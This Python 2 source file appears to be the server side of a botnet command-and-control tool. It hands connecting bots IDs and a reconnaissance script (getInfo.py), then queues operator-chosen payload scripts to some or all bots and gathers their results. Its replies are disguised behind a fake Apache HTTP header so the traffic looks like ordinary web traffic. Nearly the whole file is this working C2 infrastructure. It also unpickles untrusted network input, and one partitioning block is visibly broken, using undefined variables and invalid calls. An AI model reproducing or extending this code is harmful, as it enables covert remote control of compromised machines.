from multiprocessing import Process, Queue, Pool, Manager, active_children
import threading
from threading import Lock
import socket
import logging
import sys, signal, os
import cPickle
import random, string
import base64
import time
import datetime
import Queue

PORT = ('localhost', 80)
commandQueue = Queue.Queue() #Holds commands from GUI to be processed by commandHandler thread
processQueue = Queue.Queue() #Holds queue of processes to be terminated on shutdown

class Bot:
    ID = ''
    fqn = ''
    machine = ''
    OS = ''
    info = ''
    IP = ''
    port = 0
    time = ''
    def dump(self):
        logging.info( "Bot: " + self.ID + ";" + self.fqn + ";" + self.machine + ";" + self.OS + ";" + self.info + ";" + self.IP + ";" + str(self.port) + ';' + self.time)

#unfortunately manager.list does not handle custom classes very well so we manually convert targets and results to strings
class Payload:
    ID = ''
    command = ''
    name = ''
    targets = "" #list of bots
    results = "" #list of botId and results
    def addTarget(self, botId):
        temp = []
        if(self.targets == ""):
            temp.append(botId)
        else:
            temp = cPickle.loads(self.targets);
            temp.append(botId)
        self.targets = cPickle.dumps(temp)
    def addResult(self, botId, r):
        temp = {}
        if(self.results == ""):
            temp[botId] = r
        else:
            temp = cPickle.loads(self.results);
            temp[botId] = r
        self.results = cPickle.dumps(temp)
    def getTargets(self):
        temp = []
        if(self.targets != ""):
            temp = cPickle.loads(self.targets);
        return temp
    def getResults(self):
        temp = {}
        if(self.results != ""):
            temp = cPickle.loads(self.results);
        return temp

#listens for connections from bots
def server(finishedPayloads, payloadProxy, BOTS):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(PORT)
    sock.listen(1)
    curr_payloads = []
    c = 0
    while True:
        logging.debug("Server while loop")
        logging.debug("Payload Queue size: " + str(len(payloadProxy[0])))
        conn, address = sock.accept()
        threading.Thread(target = communicate, args=(conn, address, payloadProxy, BOTS, finishedPayloads)).start()
        for key, value in BOTS.items():
            value.dump()
    sock.close()

def parse_get(request):
    #return (id, action, script, result)
    tokens = request.split(' ')
    path = tokens[1]
    if path == "/":
        return ('', '', '', '')
    try:
        pathTokens = path.split('/')
        botId = pathTokens[1]
        action = ''
        if len(pathTokens) > 3:
            action = pathTokens[2]
        result = ''
        if '_res=' in request:
            result = request.split('_res=', 1)[1].split(' ', 1)[0]
        script = ''
        if '_src=' in request:
            script = request.split('_src=', 1)[1].split(' ', 1)[0]
        return (botId, action, script, result)
    except:
        return ('', '', '', '')

def getID():
    return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(8))

def genCommandFromPayload(payload):
    command = payload.command
    full_command = str(len(command)) + ';' + payload.ID + ";" + command
    return full_command

def createFalseHeader(length, data):
    s = '1.1 200 OK\nDate: ' + datetime.datetime.fromtimestamp(int(time.time())).strftime('%a, %d %b %Y %H:%M:%S') + '\nServer: Apache\n' + 'Content-Length: ' + str(length) + '\nConnection: close\nContent-Type:text/html\n' + data
    return s

def checkIfIsTarget(botId, payloads):
    logging.debug("Checking if is target")
    for p in payloads:
        logging.debug("Checking payload: " + p.ID)
        logging.debug("Targets: " + str(len(p.targets)))
        if botId in p.getTargets() and botId not in p.results:
            logging.debug("Is in " + p.ID)
            return p
    return ''

def communicate(conn, address, payloadProxy, BOTS, finished):
    logging.debug("Accepted connection.")
    payloads = payloadProxy[0]
    size = 1024
    try:
        get_request_data = conn.recv(size)
        logging.debug(get_request_data)
        if get_request_data:
            (botId, action, script, result) = parse_get(get_request_data)
            if botId == '':
                #new bot
                logging.debug("Creating new bot")
                newBotId = getID()
                f = open('getInfo.py', 'r')
                command = f.read()
                f.close()
                full_command = newBotId + ";" + str(len(command)) + ";" + 'getInfo.py'  + ";" + command
                response = createFalseHeader(len(full_command), full_command)
                logging.debug("Sending: " + response)
                conn.send(response)
                b = Bot()
                b.ID = newBotId
                BOTS[newBotId] = b
            else:
                if botId not in BOTS:
                    raise Exception("Invalid bot id")
                bot = BOTS[botId]
                if action == 'r':
                    #this is a reply to a script
                    if script == 'getInfo.py':
                        decoded = cPickle.loads(base64.b64decode(result))
                        bot.fqn = decoded[0]
                        bot.machine = decoded[2]
                        bot.OS = decoded[1]
                        bot.IP = decoded[3]
                        bot.time = decoded[4]
                        BOTS[bot.ID] = bot
                    else:
                        decoded = cPickle.loads(base64.b64decode(result))
                        found = False
                        rPayload = None
                        for p in payloads[:]:
                            if p.ID == script:
                                p.addResult(botId, decoded)
                                if len(p.getTargets()) == len(p.getResults()):
                                    finished.append(p)
                                    try:
                                        payloads.remove(p)
                                    except Exception, e:
                                        logging.info(str(e))
                                        logging.info("Failed to remove payload")
                                found = True
                                break
                        if not found:
                            #not expeccted
                            logging.info("Received unexpected results from " + botId)
                else:
                    #here we need to check for a payload or return Nada
                    p = ''
                    if len(payloads) > 0:
                        p = checkIfIsTarget(botId, payloads)
                    if p != '':
                        logging.debug("Payload selected: " + p.ID)
                        if "XYZ12" in p:#this is sieve payload
							for line in p.split('\n'):
								#grab lines
								#look for n = int
								#then index into it by BOTID
								#then put proper values for top/bottom of the partition
								if "n = " not in line:
									continue
								topofsieve = line.split(' ')[2]
								index = BOTS.values().index(botid)
								partitionint = int(n/BOTS.values().length())
								p.append("\ntlow = {}\nthigh = {}\n".format(partitionint*index, (index+1)*partitionint-1))
                        full_command = genCommandFromPayload(p)
                        response = createFalseHeader(len(full_command), full_command)
                        logging.debug("Sending Response: " + response)
                        conn.send(response)
                    else:
                        full_command = 'Nada'
                        response = createFalseHeader(len(full_command), full_command)
                        conn.send(response)
        else:
            logging.debug("No Data")
            raise Exception('Connection disconnected')
    except Exception, e:
        logging.debug("Unexpected Error: " + str(e))
        conn.close()
        payloadProxy[0] = payloads
        return False
    payloadProxy[0] = payloads
    conn.close()
def shutdownGracefully():
    children = active_children()
    commandQueue.put('TERMINATE')
    for child in children:
        child.terminate()
        child.join()
    while not processQueue.empty():
        p = processQueue.get()
        p.terminate()
        p.join()
    sys.exit(0)    
def signal_handler(signal, frame):
    shutdownGracefully()
class ExternalCommand:
    command = ''
    payloadID = ''
def executeCommand(command, payloadProxy, finished, BOTS):
    """
    Available Commands
    l = load payload
      Usage: l <payload_file_name> <selectedbots>
      Example: l getInfo.py bot1ID:bot2ID:bot3ID
      or: l getInfo.py all
    r = get results
      Usage: r <PayloadID>
    """
    payloadList = payloadProxy[0]
    payloadID = command.payloadID
    cmd = command.command
    tokens = cmd.split(' ', 1)
    com = tokens[0]
    args = tokens[1]
    
    if com == 'l':#modify stuff here for "self-modifying" code
        args = args.split(' ')
        fname = args[0]
        p = Payload()
        p.name = fname
        f = open(fname, 'r')
        p.command = f.read()
        f.close()
        p.ID = payloadID
        if args[1].lower() == 'all':
            for key, value in BOTS.items():
                p.addTarget(key)
        else:
            bots = args[1].split(':')
            for key, value in BOTS.items():
                if key in bots:
                    p.addTarget(key)
        logging.debug("Adding payload: " + p.ID)
        payloadList.append(p)
    if com == 'r':
        #send to gui
        sendToGUI([p.getResults() for p in finished if p.ID == args])
    payloadProxy[0] = payloadList
    
def commandHandler(payloadList, finishedList, BOTS):
    global commandQueue
    while True:
        cmd = commandQueue.get()
        try:
            if cmd == 'TERMINATE': break
        except:
            logging.info("Executing Command")
        try:
            executeCommand(cmd, payloadList, finishedList, BOTS)
        except Exception, e:
            logging.info("Failed Executing Command: " + str(e))

message_lock = Lock()

def sendToGUI(message):
    message_lock.acquire()
    try:
        print message
    finally:
        message_lock.release()

def main():
    logging.info("Starting main.")
    manager = Manager()
    finishedPayloadList = manager.list()
    payloadProxy = manager.list()
    payloadProxy.append([]);
    BOTS = manager.dict()
    serverproc = Process(target=server, args=(finishedPayloadList, payloadProxy, BOTS))
    serverproc.daemon = True
    serverproc.start()
    processQueue.put(serverproc)
    #grabs values from command queue and interprets it
    cmd_thread = threading.Thread(target = commandHandler, args=(payloadProxy, finishedPayloadList, BOTS))
    cmd_thread.start()
    while True:
        try:
            cmd = raw_input("Please input next command ('help' for help): ")
        except Exception, e:
            logging.info("Invalid input: " + str(e))
            break
        if cmd == 'q' or cmd == "quit":
            break
        try:
            newCommand = ExternalCommand()
            newCommand.command = cmd
            if cmd.split(' ')[0] == 'l':
                newCommand.payloadID = getID()
                sendToGUI( newCommand.payloadID + ' ' + cmd.split(' ')[1])
            else:
                newCommand.payloadID = cmd.split(' ')[1]
                sendToGUI( newCommand.payloadID)

            global commandQueue
            commandQueue.put(newCommand)
        except:
            continue
    shutdownGracefully()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    logging.basicConfig(filename='serverLog.log',level=logging.DEBUG)
    main()
